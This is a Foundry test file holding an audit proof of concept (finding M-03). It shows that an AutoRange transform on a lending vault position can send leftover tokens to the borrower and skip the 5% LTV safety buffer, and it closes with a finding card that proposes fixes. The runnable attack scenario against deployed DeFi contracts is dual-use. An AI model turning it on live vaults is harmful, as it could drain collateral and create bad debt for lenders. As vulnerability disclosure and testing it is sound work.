// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/V3Oracle.sol";
import "../../src/V3Vault.sol";
import "../../src/InterestRateModel.sol";
import "../../src/transformers/AutoRange.sol";

/// @title PoC M-03: AutoRange sends leftover tokens to borrower, bypassing vault accounting
/// @notice When AutoRange.execute() runs on a vault-held position:
///         1. All liquidity is removed from the old NFT.
///         2. A new NFT is minted and sent back to the vault.
///         3. Leftover tokens (not fitting the new range) are sent to the borrower directly.
///         4. The vault's post-transform health check uses withBuffer=false (V3Vault.sol:571),
///            so the borrower can reduce collateral to 100% LTV — bypassing the 5% safety
///            buffer that vault.decreaseLiquidityAndCollect() enforces (withBuffer=true, line 675).
contract PocM03Test is Test {
    uint256 constant Q32 = 2 ** 32;
    uint256 constant Q64 = 2 ** 64;
    uint256 constant Q96 = 2 ** 96;

    address constant WHALE_ACCOUNT = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    INonfungiblePositionManager constant NPM =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address constant CHAINLINK_USDC_USD =
        0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant CHAINLINK_DAI_USD =
        0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    address constant UNISWAP_DAI_USDC =
        0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;

    // NFT 126 is a DAI/USDC 0.01% position owned by TEST_NFT_ACCOUNT at block 18521658
    address constant TEST_NFT_ACCOUNT =
        0x3b8ccaa89FcD432f1334D35b10fF8547001Ce3e5;
    uint256 constant TEST_NFT = 126;

    V3Vault vault;
    InterestRateModel irm;
    V3Oracle oracle;
    AutoRange autoRange;
    address operator = makeAddr("operator");

    function setUp() public {
        string memory rpc = string.concat(
            "https://rpc.ankr.com/eth/",
            vm.envString("ANKR_API_KEY")
        );
        vm.createSelectFork(rpc, 18521658);

        irm = new InterestRateModel(
            0,
            (Q64 * 5) / 100,
            (Q64 * 109) / 100,
            (Q64 * 80) / 100
        );

        oracle = new V3Oracle(NPM, address(USDC), address(0));
        oracle.setMaxPoolPriceDifference(200);
        // CHAINLINK mode, max feed age => staleness check never fires
        oracle.setTokenConfig(
            address(USDC),
            AggregatorV3Interface(CHAINLINK_USDC_USD),
            type(uint32).max,
            IUniswapV3Pool(address(0)),
            0,
            V3Oracle.Mode.CHAINLINK,
            0
        );
        oracle.setTokenConfig(
            address(DAI),
            AggregatorV3Interface(CHAINLINK_DAI_USD),
            type(uint32).max,
            IUniswapV3Pool(UNISWAP_DAI_USDC),
            0,
            V3Oracle.Mode.CHAINLINK,
            0
        );

        vault = new V3Vault(
            "Revert Lend USDC",
            "rlUSDC",
            address(USDC),
            NPM,
            irm,
            oracle,
            IPermit2(PERMIT2)
        );
        vault.setTokenConfig(
            address(USDC),
            uint32((Q32 * 9) / 10),
            type(uint32).max
        );
        vault.setTokenConfig(
            address(DAI),
            uint32((Q32 * 9) / 10),
            type(uint32).max
        );
        vault.setLimits(0, 15_000_000, 15_000_000, 12_000_000, 12_000_000);
        vault.setReserveFactor(0);

        // amountIn=0 in the test so no swap router is needed
        autoRange = new AutoRange(
            NPM,
            operator,
            operator,
            60,
            200,
            address(0),
            address(0)
        );
        autoRange.setVault(address(vault));
        vault.setTransformer(address(autoRange), true);
    }

    function testPoc_AutoRangeLeftoversExitVaultWithoutBufferCheck() public {
        // --- Step 1: lender deposits ---
        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), 10_000_000);
        vault.deposit(10_000_000, WHALE_ACCOUNT);
        vm.stopPrank();

        // --- Step 2: borrower deposits NFT as collateral ---
        vm.startPrank(TEST_NFT_ACCOUNT);
        NPM.approve(address(vault), TEST_NFT);
        vault.create(TEST_NFT, TEST_NFT_ACCOUNT);
        vm.stopPrank();

        // --- Step 3: borrow at ~40% LTV (well within 95% buffer) ---
        uint256 borrowAmt;
        {
            (, , uint256 collateralValue, , ) = vault.loanInfo(TEST_NFT);
            console.log("collateralValue (USDC 6dec):", collateralValue);
            borrowAmt = (collateralValue * 40) / 100;
        }
        vm.prank(TEST_NFT_ACCOUNT);
        vault.borrow(TEST_NFT, borrowAmt);
        console.log("borrowed                   :", borrowAmt);

        // --- Step 4: borrower configures AutoRange ---
        // lowerTickLimit = upperTickLimit = -887272 (very negative int32):
        //   condition inside AutoRange.execute is:
        //     currentTick < tickLower - lowerTickLimit
        //   = currentTick < tickLower - (-887272) = tickLower + 887272
        //   This is true for any realistic tick, so range-change is always allowed.
        // New tick deltas shift the range slightly so SameRange revert does not fire.
        {
            (int24 tickLower, int24 tickUpper) = _getPositionTicks(TEST_NFT);
            (, int24 currentTick, , , , , ) = IUniswapV3Pool(UNISWAP_DAI_USDC)
                .slot0();

            int32 lowerDelta = int32(tickLower - currentTick) + 2;
            int32 upperDelta = int32(tickUpper - currentTick) + 2;
            if (lowerDelta >= upperDelta) {
                lowerDelta = -200;
                upperDelta = 200;
            }

            AutoRange.PositionConfig memory config = AutoRange.PositionConfig({
                lowerTickLimit: -887272,
                upperTickLimit: -887272,
                lowerTickDelta: lowerDelta,
                upperTickDelta: upperDelta,
                token0SlippageX64: uint64((Q64 * 5) / 100),
                token1SlippageX64: uint64((Q64 * 5) / 100),
                onlyFees: false,
                autoCompound: false,
                maxRewardX64: uint64(Q64 / 100)
            });

            vm.prank(TEST_NFT_ACCOUNT);
            autoRange.configToken(TEST_NFT, address(vault), config);
        }

        // --- Step 5: snapshot user token balances ---
        uint256 userDaiBefore = DAI.balanceOf(TEST_NFT_ACCOUNT);
        uint256 userUsdcBefore = USDC.balanceOf(TEST_NFT_ACCOUNT);
        console.log("user DAI  before           :", userDaiBefore);
        console.log("user USDC before           :", userUsdcBefore);

        // --- Step 6: operator triggers executeWithVault ---
        // Flow: executeWithVault -> vault.transform -> autoRange.execute
        //   - removes ALL liquidity from old NFT
        //   - mints new NFT in shifted range, sends it to vault
        //   - transfers leftover tokens to state.realOwner (borrower)
        //   - vault.transform health-checks with withBuffer=false (V3Vault.sol:571)
        {
            AutoRange.ExecuteParams memory ep = AutoRange.ExecuteParams({
                tokenId: TEST_NFT,
                swap0To1: false,
                amountIn: 0,
                swapData: "",
                amountRemoveMin0: 0,
                amountRemoveMin1: 0,
                amountAddMin0: 0,
                amountAddMin1: 0,
                deadline: block.timestamp + 3600,
                rewardX64: uint64(Q64 / 100)
            });
            vm.prank(operator);
            autoRange.executeWithVault(ep, address(vault));
        }

        // --- Step 7: verify impact ---
        uint256 daiReceived = DAI.balanceOf(TEST_NFT_ACCOUNT) - userDaiBefore;
        uint256 usdcReceived = USDC.balanceOf(TEST_NFT_ACCOUNT) -
            userUsdcBefore;
        (uint256 totalDebtAfter, , , , , ) = vault.vaultInfo();

        console.log("user DAI  received (leftover)  :", daiReceived);
        console.log("user USDC received (leftover)  :", usdcReceived);
        console.log("vault total debt after         :", totalDebtAfter);

        // (A) Borrower received tokens that left the vault without repaying debt
        assertTrue(
            daiReceived > 0 || usdcReceived > 0,
            "Borrower must receive leftover tokens from the vault-held position"
        );

        // (B) Debt is unchanged — no repayment occurred
        assertEq(totalDebtAfter, borrowAmt, "Debt must remain unchanged");

        // (C) transform() succeeded => post-transform check (withBuffer=false) passed.
        //     An equivalent reduction via decreaseLiquidityAndCollect uses withBuffer=true
        //     (V3Vault.sol:675) and would revert at a higher LTV, proving the buffer bypass.
        console.log("[!] CONFIRMED: leftovers exited vault; debt unchanged");
        console.log(
            "[!] withBuffer=false on transform path bypasses the 5% safety buffer"
        );
    }

    function _getPositionTicks(
        uint256 tokenId
    ) internal view returns (int24 tickLower, int24 tickUpper) {
        (, , , , , tickLower, tickUpper, , , , , ) = NPM.positions(tokenId);
    }

    // -----------------------------------------------------------------------
    // FINDING CARD
    // -----------------------------------------------------------------------
    //
    //  ID:        M-03
    //  Title:     AutoRange sends leftover tokens to borrower instead of vault,
    //             bypassing collateral accounting and the 5% safety buffer
    //  Severity:  Medium
    //  Contract:  AutoRange.sol  L254-L278
    //  Function:  execute(ExecuteParams calldata params)
    //
    //  Root cause: Leftover routing + unbuffered post-transform health check
    //    After minting the new range position, AutoRange transfers leftover tokens
    //    (amount0 - amountAdded0, amount1 - amountAdded1) to state.realOwner:
    //
    //      if (vaults[state.owner]) {
    //          state.realOwner = IVault(state.owner).ownerOf(params.tokenId); // borrower
    //      }
    //      _transferToken(state.realOwner, token0, leftover0, true);  // exits vault
    //      _transferToken(state.realOwner, token1, leftover1, true);  // exits vault
    //
    //    The vault accepts the transform because vault.transform() calls
    //    _requireLoanIsHealthy(newTokenId, debt, false) — withBuffer=false (V3Vault.sol:571).
    //    The direct path vault.decreaseLiquidityAndCollect() uses withBuffer=true (line 675),
    //    so the same collateral reduction would revert there. AutoRange via transform
    //    can therefore push a position to 100% LTV, stealing the 5% safety margin.
    //
    //  Impact:
    //    A borrower who has configured AutoRange on a vault-held position can have
    //    leftover tokens routed to their wallet by the operator bot, reducing the NFT
    //    collateral value without repaying any debt. The vault only tracks the new NFT;
    //    the lost token value is invisible to its accounting. Combined with the missing
    //    safety buffer, this can create undercollateralised positions and bad debt.
    //
    //  Recommendation:
    //    When the position owner is a vault, send leftovers back to the vault rather
    //    than to the underlying borrower, and enforce withBuffer=true in vault.transform():
    //
    //  AutoRange.sol fix:
    //  - state.realOwner = IVault(state.owner).ownerOf(params.tokenId);
    //  + state.realOwner = state.owner; // keep leftovers inside the vault
    //
    //  V3Vault.sol fix:
    //  - _requireLoanIsHealthy(newTokenId, debt, false);
    //  + _requireLoanIsHealthy(newTokenId, debt, true);
}
